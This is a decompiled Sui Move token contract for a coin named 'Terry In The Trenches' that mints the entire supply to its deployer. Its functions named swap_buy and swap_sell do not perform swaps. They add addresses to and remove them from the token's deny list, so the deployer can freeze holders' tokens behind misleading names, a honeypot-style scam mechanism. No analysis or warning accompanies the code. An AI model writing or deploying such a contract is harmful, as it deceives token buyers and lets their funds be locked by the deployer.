module 0x147217c144f8a0975c6a5b45be62499f6a7c604b9e65ecd30e8dec67aa431e61::terry {
    struct TERRY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TERRY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TERRY>(arg0, 9, b"Terry", b"Terry In The Trenches", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmS6UQwyqPsocstbR896GKVjxyoAkwLR19bPYsrZYmMqfU"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TERRY>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TERRY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TERRY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TERRY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TERRY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TERRY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TERRY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TERRY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

